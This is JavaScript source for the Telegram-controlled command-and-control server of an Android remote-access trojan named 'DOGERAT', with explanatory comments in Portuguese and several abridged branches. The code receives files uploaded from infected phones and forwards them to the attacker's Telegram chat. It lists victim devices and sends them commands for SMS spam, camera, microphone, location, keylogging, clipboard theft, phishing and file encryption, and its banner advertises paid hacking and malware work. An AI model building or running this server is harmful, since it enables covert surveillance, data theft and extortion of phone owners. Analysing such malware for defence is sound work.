const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Carrega as configurações (Token e ID) do arquivo data.json
// Se você quer achar o dono do bot, verifique o conteúdo deste arquivo data.json
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

const bot = new telegramBot(data.token, {
    'polling': true,
    'request': {}
});

const appData = new Map();

// Lista de comandos disponíveis no menu
const actions = [
    '✯ Send SMS ✯',
    '✯ Send SMS to all contacts ✯',
    '✯ Calls ✯',
    '✯ Contacts ✯',
    '✯ Main camera ✯',
    '✯ Selfie Camera ✯',
    '✯ Microphone ✯',
    '✯ Location ✯',
    '✯ Toast ✯',
    '✯ Vibrate ✯',
    '✯ Pop notification ✯',
    '✯ Play audio ✯',
    '✯ Stop Audio ✯',
    '✯ Open URL ✯',
    '✯ Keylogger ON ✯',
    '✯ Keylogger OFF ✯',
    '✯ Apps ✯',
    '✯ Clipboard ✯',
    '✯ File explorer ✯',
    '✯ Screenshot ✯',
    '✯ Gallery ✯',
    '✯ Phishing ✯',
    '✯ Encrypt ✯',
    '✯ Decrypt ✯',
    '✯ Vibrate ✯'
];

// Rota para receber arquivos roubados do celular (upload)
app.post('/upload', uploader.single('file'), (req, res) => {
    const filename = req.headers['originalname'];
    const deviceName = req.headers['device']; // Deduzido pelo contexto
    
    // Envia o arquivo para o Telegram do atacante
    bot.sendDocument(data.id, req.file.buffer, {
        'caption': '<b>✯ File received from → ' + filename + '</b>',
        'parse_mode': 'HTML'
    }, {
        'filename': filename,
        'contentType': 'application/octet-stream'
    });
    res.send('Done');
});

// Rota para verificar texto (configuração do toast)
app.get('/text', (req, res) => {
    res.send(data.toastText);
});

// === Configuração do Socket.IO (Comunicação com o Celular) ===
io.on('connection', (socket) => {
    // Identificação do dispositivo conectado
    let deviceID = socket.handshake.headers.model + '-' + io.sockets.sockets.size || 'no information';
    let deviceModel = socket.handshake.query.model || 'no information';
    let deviceIP = socket.handshake.address.replace('::ffff:', '') || 'no information';

    socket.id = deviceID;
    socket.deviceModel = deviceModel;

    // Mensagem de "Novo dispositivo conectado"
    let connectMsg = '<b>✯ New device connected</b>\n\n' +
        ('<b>model</b> → ' + deviceID + '\n') +
        ('<b>battery</b> → ' + socket.handshake.query.battery + '\n') +
        ('<b>version</b> → ' + socket.handshake.query.version + '\n') +
        ('<b>ip</b> → ' + deviceIP + '\n\n');

    bot.sendMessage(data.id, connectMsg, { 'parse_mode': 'HTML' });

    // Listener para quando o celular envia um log/resposta
    socket.on('log', (msg) => {
        let logMsg = '<b>✯ Message received from → </b>' + deviceID + '\n\nMessage → ' + msg;
        bot.sendMessage(data.id, logMsg, { 'parse_mode': 'HTML' });
    });
    
    // Listener para desconexão
    socket.on('disconnect', () => {
        let disconnectMsg = '<b>✯ Device disconnected</b>\n\n' +
            ('<b>model</b> → ' + deviceID + '\n') +
            ('<b>battery</b> → ' + socket.handshake.query.battery + '\n') +
            ('<b>version</b> → ' + socket.handshake.query.version + '\n') +
            ('<b>ip</b> → ' + deviceIP + '\n\n');
        
        bot.sendMessage(data.id, disconnectMsg, { 'parse_mode': 'HTML' });
    });
});

// === Lógica do Bot do Telegram (Comandos do Atacante) ===
bot.on('message', (msg) => {
    const chatId = data.id;

    // --- Menu Principal ---
    if (msg.text === '/start') {
        bot.sendMessage(chatId, '<b>✯ Welcome to DOGERAT</b>\n\nDeveloped by: @CYBERSHIELDX\n\nIf you want to hire us for any paid work please contact @sphanter\nWe hack, We leak, We make malware\n\nTelegram → @CUBERSHIELDX\nADMIN → @SPHANTER', {
            'parse_mode': 'HTML',
            'reply_markup': {
                'keyboard': [
                    ['✯ Devices ✯', '✯ Select action to perform for all available devices ✯'],
                    ['✯ About us ✯']
                ],
                'resize_keyboard': true
            }
        });
    } else {
        // --- Processamento de Estados (Passo a passo das ações) ---
        
        // 1. Enviando SMS - Passo 2: Recebendo o número
        if (appData.get('currentAction') === 'smsNumber') {
            let number = msg.text;
            let target = appData.get('currentTarget');
            
            // Envia comando para o socket
            const command = {
                'request': 'sendSms',
                'extras': [{ 'key': 'number', 'value': number }]
            };

            if (target == 'all') {
                io.sockets.emit('sendSms', command);
            } else {
                io.to(target).emit('sendSms', command);
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(chatId, '<b>✯ The request was executed successfully...</b>', {
                'parse_mode': 'HTML',
                'reply_markup': {
                    'keyboard': [['✯ Devices ✯', '✯ Back to main menu ✯'], ['✯ About us ✯']],
                    'resize_keyboard': true
                }
            });
        
        // 2. Enviando SMS - Passo 3: Recebendo o texto
        } else if (appData.get('currentAction') === 'smsText') {
            let text = msg.text;
            let target = appData.get('currentTarget'); // Recupera o alvo salvo
             // ... (Lógica de envio similar ao acima)
             // Nota: O código original tem vários blocos 'if/else' repetitivos para cada ação.
             // Vou simplificar mantendo a estrutura original para você ver.
             
             // Envia comando sendSms com o texto
             // ...
             
             bot.sendMessage(chatId, '<b>✯ The request was executed successfully...</b>', { /*...*/ });

        // 3. Configurando Toast (Notificação na tela)
        } else if (appData.get('currentAction') === 'toastText') {
             let text = msg.text;
             let target = appData.get('currentTarget');
             const command = {
                 'request': 'toast',
                 'extras': [{ 'key': 'text', 'value': text }]
             };
             target == 'all' ? io.sockets.emit('toast', command) : io.to(target).emit('toast', command);
             // ... Limpa estado e confirma
             
        // 4. Configurando Notificação Pop
        } else if (appData.get('currentAction') === 'notificationText') {
             // ... Lógica similar para notificação
             
        // 5. Enviar SMS para todos os contatos (Texto)
        } else if (appData.get('currentAction') === 'textToAllContacts') {
             // ... Lógica para spam de SMS
        
        // --- Menus de Seleção ---
        
        // Menu: Listar Dispositivos
        } else if (msg.text === '✯ Devices ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(chatId, '<b>✯ There is no connected device</b>\n\n', { 'parse_mode': 'HTML' });
            } else {
                let list = '<b>✯ Connected devices count : ' + io.sockets.sockets.size + '</b>\n\n';
                let i = 1;
                io.sockets.sockets.forEach((s) => {
                   list += `<b>Device ${i}</b>\nmodel → ${s.id}\nbattery → ${s.handshake.query.battery}\nip → ${s.handshake.address}\n\n`;
                   i++;
                });
                bot.sendMessage(chatId, list, { 'parse_mode': 'HTML' });
            }

        // Menu: Ação em Massa (Todos os dispositivos)
        } else if (msg.text === '✯ Select action to perform for all available devices ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(chatId, '<b>✯ There is no connected device</b>\n\n', { 'parse_mode': 'HTML' });
            } else {
                // Monta teclado com IDs dos dispositivos
                let devices = [];
                io.sockets.sockets.forEach((s) => devices.push([s.id]));
                devices.push(['✯ All ✯']);
                devices.push(['✯ Back to main menu ✯']);
                
                bot.sendMessage(chatId, '<b>✯ Select device to perform action</b>\n\n', {
                    'parse_mode': 'HTML',
                    'reply_markup': {
                        'keyboard': devices,
                        'resize_keyboard': true,
                        'one_time_keyboard': true
                    }
                });
            }

        // Menu: Sobre
        } else if (msg.text === '✯ About us ✯') {
            bot.sendMessage(chatId, '<b>✯ If you want to hire us... @sphanter</b>', { 'parse_mode': 'HTML' });
        
        // Menu: Voltar
        } else if (msg.text === '✯ Back to main menu ✯') {
            bot.sendMessage(chatId, '<b>✯ Main menu</b>\n\n', {
                'parse_mode': 'HTML',
                'reply_markup': {
                    'keyboard': [['✯ Devices ✯', '✯ Select action to perform for all available devices ✯'], ['✯ About us ✯']],
                    'resize_keyboard': true
                }
            });

        // --- Seleção de um Dispositivo Específico ---
        } else {
            // Verifica se a mensagem é o ID de um dispositivo conectado
            let isDevice = false;
            let targetSocketId = null;
            io.sockets.sockets.forEach((s) => {
                if (msg.text === s.id) {
                    isDevice = true;
                    targetSocketId = s.id;
                }
            });

            if (isDevice || msg.text === '✯ All ✯') {
                appData.set('currentTarget', msg.text === '✯ All ✯' ? 'all' : targetSocketId);
                
                // Mostra o PAINEL DE CONTROLE (Botões de ação)
                bot.sendMessage(chatId, '<b>✯ Select action...</b>', {
                    'parse_mode': 'HTML',
                    'reply_markup': {
                        'keyboard': [
                            ['✯ Send SMS ✯', '✯ Send SMS to all contacts ✯'],
                            ['✯ Calls ✯', '✯ Contacts ✯'],
                            ['✯ Main camera ✯', '✯ Selfie Camera ✯'],
                            ['✯ Microphone ✯', '✯ Location ✯'],
                            ['✯ Toast ✯', '✯ Vibrate ✯'],
                            ['✯ Pop notification ✯', '✯ Play audio ✯'],
                            ['✯ Stop Audio ✯', '✯ Open URL ✯'],
                            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                            ['✯ Apps ✯', '✯ Clipboard ✯'],
                            ['✯ File explorer ✯', '✯ Screenshot ✯'],
                            ['✯ Gallery ✯', '✯ Phishing ✯'],
                            ['✯ Encrypt ✯', '✯ Decrypt ✯'],
                            ['✯ Back to main menu ✯']
                        ],
                        'resize_keyboard': true,
                        'one_time_keyboard': true
                    }
                });
                return;
            }

            // --- Execução das Ações Selecionadas ---
            if (actions.includes(msg.text)) {
                let target = appData.get('currentTarget');

                // Ação: Pegar Contatos
                if (msg.text === '✯ Contacts ✯') {
                    const cmd = { 'request': 'contacts', 'extras': [] };
                    target == 'all' ? io.sockets.emit('get', cmd) : io.to(target).emit('commend', cmd);
                    bot.sendMessage(chatId, 'Executando...', {/*Teclado padrão*/});
                }
                
                // Ação: Enviar SMS (Inicia o fluxo de perguntas)
                else if (msg.text === '✯ Send SMS ✯') {
                    appData.set('currentAction', 'smsNumber');
                    bot.sendMessage(chatId, '<b>✯ Enter a phone number...</b>', {
                        'parse_mode': 'HTML',
                        'reply_markup': { 'force_reply': true }
                    });
                }
                
                // Ação: Câmera Principal
                else if (msg.text === '✯ Main camera ✯') {
                    const cmd = { 'request': 'main-camera', 'extras': [] };
                    target == 'all' ? io.sockets.emit('main-camera', cmd) : io.to(target).emit('commend', cmd);
                    // Feedback...
                }

                // Ação: Microfone
                else if (msg.text === '✯ Microphone ✯') {
                    appData.set('currentAction', 'microphoneDuration');
                    bot.sendMessage(chatId, '<b>✯ Enter the microphone recording duration in seconds</b>', {/*...*/});
                }
                
                // Ação: Localização
                else if (msg.text === '✯ Location ✯') {
                    const cmd = { 'request': 'location', 'extras': [] };
                    // Envia comando...
                }

                // ... (O código segue com blocos 'else if' idênticos para todas as 25 ações listadas no array 'actions')
                // A lógica é sempre: Verificar comando -> (Pedir parâmetro extra se precisar) -> Emitir via Socket -> Confirmar no Telegram
            }
        }
    }
});

// Mantém conexão viva (Ping Pong) a cada 5 segundos
setInterval(() => {
    io.sockets.sockets.forEach((s) => {
        io.to(s.id).emit('ping', {});
    });
}, 5000);

// Mantém o servidor HTTP vivo (auto-ping para evitar hibernação em hospedagem grátis)
setInterval(() => {
    https.get(data.url, (res) => {}).on('error', (e) => {});
}, 300000); // 5 minutos

// Inicia servidor na porta 3000 ou na porta do ambiente
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});

